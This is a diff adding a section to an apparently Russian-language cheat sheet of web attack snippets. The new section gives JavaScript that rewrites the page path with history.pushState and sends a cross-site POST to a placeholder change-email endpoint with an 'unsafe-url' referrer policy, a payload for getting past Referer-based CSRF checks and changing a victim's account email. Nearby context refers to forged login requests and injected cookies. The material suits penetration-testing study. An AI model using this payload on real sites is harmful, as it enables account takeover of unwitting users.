@@ -67,6 +67,26 @@ fetch("https://server.net/login", {
 });
 ```
 
+### Change Referrer header
+
+Этот скрипт сделает запрос с заголовком `Referrer: https://origin.net/test`:
+
+```javascript
+history.pushState('', '', '/test');
+let data = {
+    email: 'test@server.net'
+};
+fetch("https://server.net/change-email", {
+    method: 'POST',
+    referrerPolicy: 'unsafe-url',
+    body: new URLSearchParams(data),
+    headers: {
+        'Content-Type': 'application/x-www-form-urlencoded'
+    },
+    redirect: 'follow'
+});
+```
+
 ### Add custom cookies
 
 Этот запрос к основным куки добавит еще и ваши
